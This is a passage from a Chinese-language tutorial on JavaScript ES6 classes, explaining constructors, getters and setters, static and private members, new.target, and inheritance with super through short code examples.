引擎会自动为它添加一个空的`constructor()`方法。\n\n`constructor()`方法默认返回实例对象（即`this`），完全可以指定返回另外一个对象。\n\n```javascript\nclass Foo {\n  constructor() {\n    return Object.create(null);\n  }\n}\n\nnew Foo() instanceof Foo\n// false\n```\n\n上面代码中，`constructor()`函数返回一个全新的对象，结果导致实例对象不是`Foo`类的实例。\n\n类必须使用`new`调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用`new`也可以执行。\n\n```javascript\nclass Foo {\n  constructor() {\n    return Object.create(null);\n  }\n}\n\nFoo()\n// TypeError: Class constructor Foo cannot be invoked without 'new'\n```\n\n### 类的实例\n\n生成类的实例的写法，与 ES5 完全一样，也是使用`new`命令。前面说过，如果忘记加上`new`，像函数那样调用`Class`，将会报错。\n\n```javascript\nclass Point {\n  // ...\n}\n\n// 报错\nvar point = Point(2, 3);\n\n// 正确\nvar point = new Point(2, 3);\n```\n\n与 ES5 一样，实例的属性除非显式定义在其本身（即定义在`this`对象上），否则都是定义在原型上（即定义在`class`上）。\n\n```javascript\n//定义类\nclass Point {\n\n  constructor(x, y) {\n    this.x = x;\n    this.y = y;\n  }\n\n  toString() {\n    return '(' + this.x + ', ' + this.y + ')';\n  }\n\n}\n\nvar point = new Point(2, 3);\n\npoint.toString() // (2, 3)\n\npoint.hasOwnProperty('x') // true\npoint.hasOwnProperty('y') // true\npoint.hasOwnProperty('toString') // false\npoint.__proto__.hasOwnProperty('toString') // true\n```\n\n上面代码中，`x`和`y`都是实例对象`point`自身的属性（因为定义在`this`对象上），所以`hasOwnProperty()`方法返回`true`，而`toString()`是原型对象的属性（因为定义在`Point`类上），所以`hasOwnProperty()`方法返回`false`。这些都与 ES5 的行为保持一致。\n\n与 ES5 一样，类的所有实例共享一个原型对象。\n\n```javascript\nvar p1 = new Point(2,3);\nvar p2 = new Point(3,2);\n\np1.__proto__ === p2.__proto__\n//true\n```\n\n上面代码中，`p1`和`p2`都是`Point`的实例，它们的原型都是`Point.prototype`，所以`__proto__`属性是相等的。\n\n这也意味着，可以通过实例的`__proto__`属性为“类”添加方法。\n\n> `__proto__` 并不是语言本身的特性，这是各大厂商具体实现时添加的私有属性，虽然目前很多现代浏览器的 JS 引擎中都提供了这个私有属性，但依旧不建议在生产中使用该属性，避免对环境产生依赖。生产环境中，我们可以使用 `Object.getPrototypeOf` 方法来获取实例对象的原型，然后再来为原型添加方法/属性。\n\n```javascript\nvar p1 = new Point(2,3);\nvar p2 = new Point(3,2);\n\np1.__proto__.printName = function () { return 'Oops' };\n\np1.printName() // \"Oops\"\np2.printName() // \"Oops\"\n\nvar p3 = new Point(4,2);\np3.printName() // \"Oops\"\n```\n\n上面代码在`p1`的原型上添加了一个`printName()`方法，由于`p1`的原型就是`p2`的原型，因此`p2`也可以调用这个方法。而且，此后新建的实例`p3`也可以调用这个方法。这意味着，使用实例的`__proto__`属性改写原型，必须相当谨慎，不推荐使用，因为这会改变“类”的原始定义，影响到所有实例。\n\n### 取值函数（getter）和存值函数（setter）\n\n与 ES5 一样，在“类”的内部可以使用`get`和`set`关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。\n\n```javascript\nclass MyClass {\n  constructor() {\n    // ...\n  }\n  get prop() {\n    return 'getter';\n  }\n  set prop(value) {\n    console.log('setter: '+value);\n  }\n}\n\nlet inst = new MyClass();\n\ninst.prop = 123;\n// setter: 123\n\ninst.prop\n// 'getter'\n```\n\n上面代码中，`prop`属性有对应的存值函数和取值函数，因此赋值和读取行为都被自定义了。\n\n存值函数和取值函数是设置在属性的 Descriptor 对象上的。\n\n```javascript\nclass CustomHTMLElement {\n  constructor(element) {\n    this.element = element;\n  }\n\n  get html() {\n    return this.element.innerHTML;\n  }\n\n  set html(value) {\n    this.element.innerHTML = value;\n  }\n}\n\nvar descriptor = Object.getOwnPropertyDescriptor(\n  CustomHTMLElement.prototype, \"html\"\n);\n\n\"get\" in descriptor  // true\n\"set\" in descriptor  // true\n```\n\n上面代码中，存值函数和取值函数是定义在`html`属性的描述对象上面，这与 ES5 完全一致。\n\n### 属性表达式\n\n类的属性名，可以采用表达式。\n\n```javascript\nlet methodName = 'getArea';\n\nclass Square {\n  constructor(length) {\n    // ...\n  }\n\n  [methodName]() {\n    // ...\n  }\n}\n```\n\n上面代码中，`Square`类的方法名`getArea`，是从表达式得到的。\n\n### Class 表达式\n\n与函数一样，类也可以使用表达式的形式定义。\n\n```javascript\nconst MyClass = class Me {\n  getClassName() {\n    return Me.name;\n  }\n};\n```\n\n上面代码使用表达式定义了一个类。需要注意的是，这个类的名字是`Me`，但是`Me`只在 Class 的内部可用，指代当前类。在 Class 外部，这个类只能用`MyClass`引用。\n\n```javascript\nlet inst = new MyClass();\ninst.getClassName() // Me\nMe.name // ReferenceError: Me is not defined\n```\n\n上面代码表示，`Me`只在 Class 内部有定义。\n\n如果类的内部没用到的话，可以省略`Me`，也就是可以写成下面的形式。\n\n```javascript\nconst MyClass = class { /* ... */ };\n```\n\n采用 Class 表达式，可以写出立即执行的 Class。\n\n```javascript\nlet person = new class {\n  constructor(name) {\n    this.name = name;\n  }\n\n  sayName() {\n    console.log(this.name);\n  }\n}('张三');\n\nperson.sayName(); // \"张三\"\n```\n\n上面代码中，`person`是一个立即执行的类的实例。\n\n### 注意点\n\n**（1）严格模式**\n\n类和模块的内部，默认就是严格模式，所以不需要使用`use strict`指定运行模式。只要你的代码写在类或模块之中，就只有严格模式可用。考虑到未来所有的代码，其实都是运行在模块之中，所以 ES6 实际上把整个语言升级到了严格模式。\n\n**（2）不存在提升**\n\n类不存在变量提升（hoist），这一点与 ES5 完全不同。\n\n```javascript\nnew Foo(); // ReferenceError\nclass Foo {}\n```\n\n上面代码中，`Foo`类使用在前，定义在后，这样会报错，因为 ES6 不会把类的声明提升到代码头部。这种规定的原因与下文要提到的继承有关，必须保证子类在父类之后定义。\n\n```javascript\n{\n  let Foo = class {};\n  class Bar extends Foo {\n  }\n}\n```\n\n上面的代码不会报错，因为`Bar`继承`Foo`的时候，`Foo`已经有定义了。但是，如果存在`class`的提升，上面代码就会报错，因为`class`会被提升到代码头部，而`let`命令是不提升的，所以导致`Bar`继承`Foo`的时候，`Foo`还没有定义。\n\n**（3）name 属性**\n\n由于本质上，ES6 的类只是 ES5 的构造函数的一层包装，所以函数的许多特性都被`Class`继承，包括`name`属性。\n\n```javascript\nclass Point {}\nPoint.name // \"Point\"\n```\n\n`name`属性总是返回紧跟在`class`关键字后面的类名。\n\n**（4）Generator 方法**\n\n如果某个方法之前加上星号（`*`），就表示该方法是一个 Generator 函数。\n\n```javascript\nclass Foo {\n  constructor(...args) {\n    this.args = args;\n  }\n  * [Symbol.iterator]() {\n    for (let arg of this.args) {\n      yield arg;\n    }\n  }\n}\n\nfor (let x of new Foo('hello', 'world')) {\n  console.log(x);\n}\n// hello\n// world\n```\n\n上面代码中，`Foo`类的`Symbol.iterator`方法前有一个星号，表示该方法是一个 Generator 函数。`Symbol.iterator`方法返回一个`Foo`类的默认遍历器，`for...of`循环会自动调用这个遍历器。\n\n**（5）this 的指向**\n\n类的方法内部如果含有`this`，它默认指向类的实例。但是，必须非常小心，一旦单独使用该方法，很可能报错。\n\n```javascript\nclass Logger {\n  printName(name = 'there') {\n    this.print(`Hello ${name}`);\n  }\n\n  print(text) {\n    console.log(text);\n  }\n}\n\nconst logger = new Logger();\nconst { printName } = logger;\nprintName(); // TypeError: Cannot read property 'print' of undefined\n```\n\n上面代码中，`printName`方法中的`this`，默认指向`Logger`类的实例。但是，如果将这个方法提取出来单独使用，`this`会指向该方法运行时所在的环境（由于 class 内部是严格模式，所以 this 实际指向的是`undefined`），从而导致找不到`print`方法而报错。\n\n一个比较简单的解决方法是，在构造方法中绑定`this`，这样就不会找不到`print`方法了。\n\n```javascript\nclass Logger {\n  constructor() {\n    this.printName = this.printName.bind(this);\n  }\n\n  // ...\n}\n```\n\n另一种解决方法是使用箭头函数。\n\n```javascript\nclass Obj {\n  constructor() {\n    this.getThis = () => this;\n  }\n}\n\nconst myObj = new Obj();\nmyObj.getThis() === myObj // true\n```\n\n箭头函数内部的`this`总是指向定义时所在的对象。上面代码中，箭头函数位于构造函数内部，它的定义生效的时候，是在构造函数执行的时候。这时，箭头函数所在的运行环境，肯定是实例对象，所以`this`会总是指向实例对象。\n\n还有一种解决方法是使用`Proxy`，获取方法的时候，自动绑定`this`。\n\n```javascript\nfunction selfish (target) {\n  const cache = new WeakMap();\n  const handler = {\n    get (target, key) {\n      const value = Reflect.get(target, key);\n      if (typeof value !== 'function') {\n        return value;\n      }\n      if (!cache.has(value)) {\n        cache.set(value, value.bind(target));\n      }\n      return cache.get(value);\n    }\n  };\n  const proxy = new Proxy(target, handler);\n  return proxy;\n}\n\nconst logger = selfish(new Logger());\n```\n\n## 静态方法\n\n类相当于实例的原型，所有在类中定义的方法，都会被实例继承。如果在一个方法前，加上`static`关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。\n\n```javascript\nclass Foo {\n  static classMethod() {\n    return 'hello';\n  }\n}\n\nFoo.classMethod() // 'hello'\n\nvar foo = new Foo();\nfoo.classMethod()\n// TypeError: foo.classMethod is not a function\n```\n\n上面代码中，`Foo`类的`classMethod`方法前有`static`关键字，表明该方法是一个静态方法，可以直接在`Foo`类上调用（`Foo.classMethod()`），而不是在`Foo`类的实例上调用。如果在实例上调用静态方法，会抛出一个错误，表示不存在该方法。\n\n注意，如果静态方法包含`this`关键字，这个`this`指的是类，而不是实例。\n\n```javascript\nclass Foo {\n  static bar() {\n    this.baz();\n  }\n  static baz() {\n    console.log('hello');\n  }\n  baz() {\n    console.log('world');\n  }\n}\n\nFoo.bar() // hello\n```\n\n上面代码中，静态方法`bar`调用了`this.baz`，这里的`this`指的是`Foo`类，而不是`Foo`的实例，等同于调用`Foo.baz`。另外，从这个例子还可以看出，静态方法可以与非静态方法重名。\n\n父类的静态方法，可以被子类继承。\n\n```javascript\nclass Foo {\n  static classMethod() {\n    return 'hello';\n  }\n}\n\nclass Bar extends Foo {\n}\n\nBar.classMethod() // 'hello'\n```\n\n上面代码中，父类`Foo`有一个静态方法，子类`Bar`可以调用这个方法。\n\n静态方法也是可以从`super`对象上调用的。\n\n```javascript\nclass Foo {\n  static classMethod() {\n    return 'hello';\n  }\n}\n\nclass Bar extends Foo {\n  static classMethod() {\n    return super.classMethod() + ', too';\n  }\n}\n\nBar.classMethod() // \"hello, too\"\n```\n\n## 实例属性的新写法\n\n实例属性除了定义在`constructor()`方法里面的`this`上面，也可以定义在类的最顶层。\n\n```javascript\nclass IncreasingCounter {\n  constructor() {\n    this._count = 0;\n  }\n  get value() {\n    console.log('Getting the current value!');\n    return this._count;\n  }\n  increment() {\n    this._count++;\n  }\n}\n```\n\n上面代码中，实例属性`this._count`定义在`constructor()`方法里面。另一种写法是，这个属性也可以定义在类的最顶层，其他都不变。\n\n```javascript\nclass IncreasingCounter {\n  _count = 0;\n  get value() {\n    console.log('Getting the current value!');\n    return this._count;\n  }\n  increment() {\n    this._count++;\n  }\n}\n```\n\n上面代码中，实例属性`_count`与取值函数`value()`和`increment()`方法，处于同一个层级。这时，不需要在实例属性前面加上`this`。\n\n这种新写法的好处是，所有实例对象自身的属性都定义在类的头部，看上去比较整齐，一眼就能看出这个类有哪些实例属性。\n\n```javascript\nclass foo {\n  bar = 'hello';\n  baz = 'world';\n\n  constructor() {\n    // ...\n  }\n}\n```\n\n上面的代码，一眼就能看出，`foo`类有两个实例属性，一目了然。另外，写起来也比较简洁。\n\n## 静态属性\n\n静态属性指的是 Class 本身的属性，即`Class.propName`，而不是定义在实例对象（`this`）上的属性。\n\n```javascript\nclass Foo {\n}\n\nFoo.prop = 1;\nFoo.prop // 1\n```\n\n上面的写法为`Foo`类定义了一个静态属性`prop`。\n\n目前，只有这种写法可行，因为 ES6 明确规定，Class 内部只有静态方法，没有静态属性。现在有一个[提案](https://github.com/tc39/proposal-class-fields \"https://github.com/tc39/proposal-class-fields\")提供了类的静态属性，写法是在实例属性的前面，加上`static`关键字。\n\n```javascript\nclass MyClass {\n  static myStaticProp = 42;\n\n  constructor() {\n    console.log(MyClass.myStaticProp); // 42\n  }\n}\n```\n\n这个新写法大大方便了静态属性的表达。\n\n```javascript\n// 老写法\nclass Foo {\n  // ...\n}\nFoo.prop = 1;\n\n// 新写法\nclass Foo {\n  static prop = 1;\n}\n```\n\n上面代码中，老写法的静态属性定义在类的外部。整个类生成以后，再生成静态属性。这样让人很容易忽略这个静态属性，也不符合相关代码应该放在一起的代码组织原则。另外，新写法是显式声明（declarative），而不是赋值处理，语义更好。\n\n## 私有方法和私有属性\n\n### 现有的解决方案\n\n私有方法和私有属性，是只能在类的内部访问的方法和属性，外部不能访问。这是常见需求，有利于代码的封装，但 ES6 不提供，只能通过变通方法模拟实现。\n\n一种做法是在命名上加以区别。\n\n```javascript\nclass Widget {\n\n  // 公有方法\n  foo (baz) {\n    this._bar(baz);\n  }\n\n  // 私有方法\n  _bar(baz) {\n    return this.snaf = baz;\n  }\n\n  // ...\n}\n```\n\n上面代码中，`_bar()`方法前面的下划线，表示这是一个只限于内部使用的私有方法。但是，这种命名是不保险的，在类的外部，还是可以调用到这个方法。\n\n另一种方法就是索性将私有方法移出类，因为类内部的所有方法都是对外可见的。\n\n```javascript\nclass Widget {\n  foo (baz) {\n    bar.call(this, baz);\n  }\n\n  // ...\n}\n\nfunction bar(baz) {\n  return this.snaf = baz;\n}\n```\n\n上面代码中，`foo`是公开方法，内部调用了`bar.call(this, baz)`。这使得`bar()`实际上成为了当前类的私有方法。\n\n还有一种方法是利用`Symbol`值的唯一性，将私有方法的名字命名为一个`Symbol`值。\n\n```javascript\nconst bar = Symbol('bar');\nconst snaf = Symbol('snaf');\n\nexport default class myClass{\n\n  // 公有方法\n  foo(baz) {\n    this[bar](baz);\n  }\n\n  // 私有方法\n  [bar](baz) {\n    return this[snaf] = baz;\n  }\n\n  // ...\n};\n```\n\n上面代码中，`bar`和`snaf`都是`Symbol`值，一般情况下无法获取到它们，因此达到了私有方法和私有属性的效果。但是也不是绝对不行，`Reflect.ownKeys()`依然可以拿到它们。\n\n```javascript\nconst inst = new myClass();\n\nReflect.ownKeys(myClass.prototype)\n// [ 'constructor', 'foo', Symbol(bar) ]\n```\n\n上面代码中，Symbol 值的属性名依然可以从类的外部拿到。\n\n### 私有属性的提案\n\n目前，有一个[提案](https://github.com/tc39/proposal-private-methods \"https://github.com/tc39/proposal-private-methods\")，为`class`加了私有属性。方法是在属性名之前，使用`#`表示。\n\n```javascript\nclass IncreasingCounter {\n  #count = 0;\n  get value() {\n    console.log('Getting the current value!');\n    return this.#count;\n  }\n  increment() {\n    this.#count++;\n  }\n}\n```\n\n上面代码中，`#count`就是私有属性，只能在类的内部使用（`this.#count`）。如果在类的外部使用，就会报错。\n\n```javascript\nconst counter = new IncreasingCounter();\ncounter.#count // 报错\ncounter.#count = 42 // 报错\n```\n\n上面代码在类的外部，读取私有属性，就会报错。\n\n下面是另一个例子。\n\n```javascript\nclass Point {\n  #x;\n\n  constructor(x = 0) {\n    this.#x = +x;\n  }\n\n  get x() {\n    return this.#x;\n  }\n\n  set x(value) {\n    this.#x = +value;\n  }\n}\n```\n\n上面代码中，`#x`就是私有属性，在`Point`类之外是读取不到这个属性的。由于井号`#`是属性名的一部分，使用时必须带有`#`一起使用，所以`#x`和`x`是两个不同的属性。\n\n之所以要引入一个新的前缀`#`表示私有属性，而没有采用`private`关键字，是因为 JavaScript 是一门动态语言，没有类型声明，使用独立的符号似乎是唯一的比较方便可靠的方法，能够准确地区分一种属性是否为私有属性。另外，Ruby 语言使用`@`表示私有属性，ES6 没有用这个符号而使用`#`，是因为`@`已经被留给了 Decorator。\n\n这种写法不仅可以写私有属性，还可以用来写私有方法。\n\n```javascript\nclass Foo {\n  #a;\n  #b;\n  constructor(a, b) {\n    this.#a = a;\n    this.#b = b;\n  }\n  #sum() {\n    return this.#a + this.#b;\n  }\n  printSum() {\n    console.log(this.#sum());\n  }\n}\n```\n\n上面代码中，`#sum()`就是一个私有方法。\n\n另外，私有属性也可以设置 getter 和 setter 方法。\n\n```javascript\nclass Counter {\n  #xValue = 0;\n\n  constructor() {\n    super();\n    // ...\n  }\n\n  get #x() { return #xValue; }\n  set #x(value) {\n    this.#xValue = value;\n  }\n}\n```\n\n上面代码中，`#x`是一个私有属性，它的读写都通过`get #x()`和`set #x()`来完成。\n\n私有属性不限于从`this`引用，只要是在类的内部，实例也可以引用私有属性。\n\n```javascript\nclass Foo {\n  #privateValue = 42;\n  static getPrivateValue(foo) {\n    return foo.#privateValue;\n  }\n}\n\nFoo.getPrivateValue(new Foo()); // 42\n```\n\n上面代码允许从实例`foo`上面引用私有属性。\n\n私有属性和私有方法前面，也可以加上`static`关键字，表示这是一个静态的私有属性或私有方法。\n\n```javascript\nclass FakeMath {\n  static PI = 22 / 7;\n  static #totallyRandomNumber = 4;\n\n  static #computeRandomNumber() {\n    return FakeMath.#totallyRandomNumber;\n  }\n\n  static random() {\n    console.log('I heard you like random numbers…')\n    return FakeMath.#computeRandomNumber();\n  }\n}\n\nFakeMath.PI // 3.142857142857143\nFakeMath.random()\n// I heard you like random numbers…\n// 4\nFakeMath.#totallyRandomNumber // 报错\nFakeMath.#computeRandomNumber() // 报错\n```\n\n上面代码中，`#totallyRandomNumber`是私有属性，`#computeRandomNumber()`是私有方法，只能在`FakeMath`这个类的内部调用，外部调用就会报错。\n\n### in 运算符\n\n`try...catch`结构可以用来判断是否存在某个私有属性。\n\n```javascript\nclass A {\n  use(obj) {\n    try {\n      obj.#foo;\n    } catch {\n      // 私有属性 #foo 不存在\n    }\n  }\n}\n\nconst a = new A();\na.use(a); // 报错\n```\n\n上面示例中，类`A`并不存在私有属性`#foo`，所以`try...catch`报错了。\n\n这样的写法很麻烦，可读性很差，V8 引擎改进了`in`运算符，使它也可以用来判断私有属性。\n\n```javascript\nclass A {\n  use(obj) {\n    if (#foo in obj) {\n      // 私有属性 #foo 存在\n    } else {\n      // 私有属性 #foo 不存在\n    }\n  }\n}\n```\n\n上面示例中，`in`运算符判断当前类`A`的实例，是否有私有属性`#foo`，如果有返回`true`，否则返回`false`。\n\n`in`也可以跟`this`一起配合使用。\n\n```javascript\nclass A {\n  #foo = 0;\n  m() {\n    console.log(#foo in this); // true\n    console.log(#bar in this); // false\n  }\n}\n```\n\n注意，判断私有属性时，`in`只能用在定义该私有属性的类的内部。\n\n```javascript\nclass A {\n  #foo = 0;\n  static test(obj) {\n    console.log(#foo in obj);\n  }\n}\n\nA.test(new A()) // true\nA.test({}) // false\n\nclass B {\n  #foo = 0;\n}\n\nA.test(new B()) // false\n```\n\n上面示例中，类`A`的私有属性`#foo`，只能在类`A`内部使用`in`运算符判断，而且只对`A`的实例返回`true`，对于其他对象都返回`false`。\n\n子类从父类继承的私有属性，也可以使用`in`运算符来判断。\n\n```javascript\nclass A {\n  #foo = 0;\n  static test(obj) {\n    console.log(#foo in obj);\n  }\n}\n\nclass SubA extends A {};\n\nA.test(new SubA()) // true\n```\n\n上面示例中，`SubA`从父类继承了私有属性`#foo`，`in`运算符也有效。\n\n注意，`in`运算符对于`Object.create()`、`Object.setPrototypeOf`形成的继承，是无效的，因为这种继承不会传递私有属性。\n\n```javascript\nclass A {\n  #foo = 0;\n  static test(obj) {\n    console.log(#foo in obj);\n  }\n}\nconst a = new A();\n\nconst o1 = Object.create(a);\nA.test(o1) // false\nA.test(o1.__proto__) // true\n\nconst o2 = {};\nObject.setPrototypeOf(o2, A);\nA.test(o2) // false\nA.test(o2.__proto__) // true\n```\n\n上面示例中，对于修改原型链形成的继承，子类都取不到父类的私有属性，所以`in`运算符无效。\n\n## new.target 属性\n\n`new`是从构造函数生成实例对象的命令。ES6 为`new`命令引入了一个`new.target`属性，该属性一般用在构造函数之中，返回`new`命令作用于的那个构造函数。如果构造函数不是通过`new`命令或`Reflect.construct()`调用的，`new.target`会返回`undefined`，因此这个属性可以用来确定构造函数是怎么调用的。\n\n```javascript\nfunction Person(name) {\n  if (new.target !== undefined) {\n    this.name = name;\n  } else {\n    throw new Error('必须使用 new 命令生成实例');\n  }\n}\n\n// 另一种写法\nfunction Person(name) {\n  if (new.target === Person) {\n    this.name = name;\n  } else {\n    throw new Error('必须使用 new 命令生成实例');\n  }\n}\n\nvar person = new Person('张三'); // 正确\nvar notAPerson = Person.call(person, '张三');  // 报错\n```\n\n上面代码确保构造函数只能通过`new`命令调用。\n\nClass 内部调用`new.target`，返回当前 Class。\n\n```javascript\nclass Rectangle {\n  constructor(length, width) {\n    console.log(new.target === Rectangle);\n    this.length = length;\n    this.width = width;\n  }\n}\n\nvar obj = new Rectangle(3, 4); // 输出 true\n```\n\n需要注意的是，子类继承父类时，`new.target`会返回子类。\n\n```javascript\nclass Rectangle {\n  constructor(length, width) {\n    console.log(new.target === Rectangle);\n    // ...\n  }\n}\n\nclass Square extends Rectangle {\n  constructor(length, width) {\n    super(length, width);\n  }\n}\n\nvar obj = new Square(3); // 输出 false\n```\n\n上面代码中，`new.target`会返回子类。\n\n利用这个特点，可以写出不能独立使用、必须继承后才能使用的类。\n\n```javascript\nclass Shape {\n  constructor() {\n    if (new.target === Shape) {\n      throw new Error('本类不能实例化');\n    }\n  }\n}\n\nclass Rectangle extends Shape {\n  constructor(length, width) {\n    super();\n    // ...\n  }\n}\n\nvar x = new Shape();  // 报错\nvar y = new Rectangle(3, 4);  // 正确\n```\n\n上面代码中，`Shape`类不能被实例化，只能用于继承。\n\n注意，在函数外部，使用`new.target`会报错。\n\n\n# Class 的继承\n\n## 简介\n\nClass 可以通过`extends`关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。\n\n```javascript\nclass Point {\n}\n\nclass ColorPoint extends Point {\n}\n```\n\n上面代码定义了一个`ColorPoint`类，该类通过`extends`关键字，继承了`Point`类的所有属性和方法。但是由于没有部署任何代码，所以这两个类完全一样，等于复制了一个`Point`类。下面，我们在`ColorPoint`内部加上代码。\n\n```javascript\nclass ColorPoint extends Point {\n  constructor(x, y, color) {\n    super(x, y); // 调用父类的constructor(x, y)\n    this.color = color;\n  }\n\n  toString() {\n    return this.color + ' ' + super.toString(); // 调用父类的toString()\n  }\n}\n```\n\n上面代码中，`constructor`方法和`toString`方法之中，都出现了`super`关键字，它在这里表示父类的构造函数，用来新建父类的`this`对象。\n\n子类必须在`constructor`方法中调用`super`方法，否则新建实例时会报错。这是因为子类自己的`this`对象，必须先通过父类的构造函数完成塑造，得到与父类同样的实例属性和方法，然后再对其进行加工，加上子类自己的实例属性和方法。如果不调用`super`方法，子类就得不到`this`对象。\n\n```javascript\nclass Point { /* ... */ }\n\nclass ColorPoint extends Point {\n  constructor() {\n  }\n}\n\nlet cp = new ColorPoint(); // ReferenceError\n```\n\n上面代码中，`ColorPoint`继承了父类`Point`，但是它的构造函数没有调用`super`方法，导致新建实例时报错。\n\nES5 的继承，实质是先创造子类的实例对象`this`，然后再将父类的方法添加到`this`上面（`Parent.apply(this)`）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到`this`上面（所以必须先调用`super`方法），然后再用子类的构造函数修改`this`。\n\n如果子类没有定义`constructor`方法，这个方法会被默认添加，代码如下。也就是说，不管有没有显式定义，任何一个子类都有`constructor`方法。\n\n```javascript\nclass ColorPoint extends Point {\n}\n\n// 等同于\nclass ColorPoint extends Point {\n  constructor(...args) {\n    super(...args);\n  }\n}\n```\n\n另一个需要注意的地方是，在子类的构造函数中，只有调用`super`之后，才可以使用`this`关键字，否则会报错。这是因为子类实例的构建，基于父类实例，只有`super`方法才能调用父类实例。\n\n```javascript\nclass Point {\n  constructor(x, y) {\n    this.x = x;\n    this.y = y;\n  }\n}\n\nclass ColorPoint extends Point {\n  constructor(x, y, color) {\n    this.color = color; // ReferenceError\n    super(x, y);\n    this.color = color; // 正确\n  }\n}\n```\n\n上面代码中，子类的`constructor`方法没有调用`super`之前，就使用`this`关键字，结果报错，而放在`super`方法之后就是正确的。\n\n下面是生成子类实例的代码。\n\n```javascript\nlet cp = new ColorPoint(25, 8, 'green');\n\ncp instanceof ColorPoint // true\ncp instanceof Point // true\n```\n\n上面代码中，实例对象`cp`同时是`ColorPoint`和`Point`两个类的实例，这与 ES5 的行为完全一致。\n\n最后，父类的静态方法，也会被子类继承。\n\n```javascript\nclass A {\n  static hello() {\n    console.log('hello world');\n  }\n}\n\nclass B extends A {\n}\n\nB.hello()  // hello world\n```\n\n上面代码中，`hello()`是`A`类的静态方法，`B`继承`A`，也继承了`A`的静态方法。\n\n## Object.getPrototypeOf()\n\n`Object.getPrototypeOf`方法可以用来从子类上获取父类。\n\n```javascript\nObject.getPrototypeOf(ColorPoint) === Point\n// true\n```\n\n因此，可以使用这个方法判断，一个类是否继承了另一个类。\n\n## super 关键字\n\n`super`这个关键字，既可以当作函数使用，也可以当作对象使用。在这两种情况下，它的用法完全不同。\n\n第一种情况，`super`作为函数调用时，代表父类的构造函数。ES6 要求，子类的构造函数必须执行一次`super`函数。\n\n```javascript\nclass A {}\n\nclass B extends A {\n  constructor() {\n    super();\n  }\n}\n```\n\n上面代码中，子类`B`的构造函数之中的`super()`，代表调用父类的构造函数。这是必须的，否则 JavaScript 引擎会报错。\n\n注意，`super`虽然代表了父类`A`的构造函数，但是返回的是子类`B`的实例，即`super`内部的`this`指的是`B`的实例，因此`super()`在这里相当于`A.prototype.constructor.call(this)`。\n\n```javascript\nclass A {\n  constructor() {\n    console.log(new.target.name);\n  }\n}\nclass B extends A {\n  constructor() {\n    super();\n  }\n}\nnew A() // A\nnew B() // B\n```\n\n上面代码中，`new.target`指向当前正在执行的函数。可以看到，在`super()`执行时，它指向的是子类`B`的构造函数，而不是父类`A`的构造函数。也就是说，`super()`内部的`this`指向的是`B`。\n\n作为函数时，`super()`只能用在子类的构造函数之中，用在其他地方就会报错。\n\n```javascript\nclass A {}\n\nclass B extends A {\n  m() {\n    super(); // 报错\n  }\n}\n```\n\n上面代码中，`super()`用在`B`类的`m`方法之中，就会造成语法错误。\n\n第二种情况，`super`作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。\n\n```javascript\nclass A {\n  p() {\n    return 2;\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super.p()); // 2\n  }\n}\n\nlet b = new B();\n```\n\n上面代码中，子类`B`当中的`super.p()`，就是将`super`当作一个对象使用。这时，`super`在普通方法之中，指向`A.prototype`，所以`super.p()`就相当于`A.prototype.p()`。\n\n这里需要注意，由于`super`指向父类的原型对象，所以定义在父类实例上的方法或属性，是无法通过`super`调用的。\n\n```javascript\nclass A {\n  constructor() {\n    this.p = 2;\n  }\n}\n\nclass B extends A {\n  get m() {\n    return super.p;\n  }\n}\n\nlet b = new B();\nb.m // undefined\n```\n\n上面代码中，`p`是父类`A`实例的属性，`super.p`就引用不到它。\n\n如果属性定义在父类的原型对象上，`super`就可以取到。\n\n```javascript\nclass A {}\nA.prototype.x = 2;\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super.x) // 2\n  }\n}\n\nlet b = new B();\n```\n\n上面代码中，属性`x`是定义在`A.prototype`上面的，所以`super.x`可以取到它的值。\n\nES6 规定，在子类普通方法中通过`super`调用父类的方法时，方法内部的`this`指向当前的子类实例。\n\n```javascript\nclass A {\n  constructor() {\n    this.x = 1;\n  }\n  print() {\n    console.log(this.x);\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    this.x = 2;\n  }\n  m() {\n    super.print();\n  }\n}\n\nlet b = new B();\nb.m() // 2\n```\n\n上面代码中，`super.print()`虽然调用的是`A.prototype.print()`，但是`A.prototype.print()`内部的`this`指向子类`B`的实例，导致输出的是`2`，而不是`1`。也就是说，实际上执行的是`super.print.call(this)`。\n\n由于`this`指向子类实例，所以如果通过`super`对某个属性赋值，这时`super`就是`this`，赋值的属性会变成子类实例的属性。\n\n```javascript\nclass A {\n  constructor() {\n    this.x = 1;\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    this.x = 2;\n    super.x = 3;\n    console.log(super.x); // undefined\n    console.log(this.x); // 3\n  }\n}\n\nlet b = new B();\n```\n\n上面代码中，`super.x`赋值为`3`，这时等同于对`this.x`赋值为`3`。而当读取`super.x`的时候，读的是`A.prototype.x`，所以返回`undefined`。\n\n如果`super`作为对象，用在静态方法之中，这时`super`将指向父类，而不是父类的原型对象。\n\n```javascript\nclass Parent {\n  static myMethod(msg) {\n    console.log('static', msg);\n  }\n\n  myMethod(msg) {\n    console.log('instance', msg);\n  }\n}\n\nclass Child extends Parent {\n  static myMethod(msg) {\n    super.myMethod(msg);\n  }\n\n  myMethod(msg) {\n    super.myMethod(msg);\n  }\n}\n\nChild.myMethod(1); // static 1\n\nvar child = new Child();\nchild.myMethod(2); // instance 2\n```\n\n上面代码中，`super`在静态方法之中指向父类，在普通方法之中指向父类的原型对象。\n\n另外，在子类的静态方法中通过`super`调用父类的方法时，方法内部的`this`指向当前的子类，而不是子类的实例。\n\n```javascript\nclass A {\n  constructor() {\n    this.x = 1;\n  }\n  static print() {\n    console.log(this.x);\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    this.x = 2;\n  }\n  static m() {\n    super.print();\n  }\n}\n\nB.x = 3;\nB.m() // 3\n```\n\n上面代码中，静态方法`B.m`里面，`super.print`指向父类的静态方法。这个方法里面的`this`指向的是`B`，而不是`B`的实例。\n\n注意，使用`super`的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。\n\n```javascript\nclass A {}\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super); // 报错\n  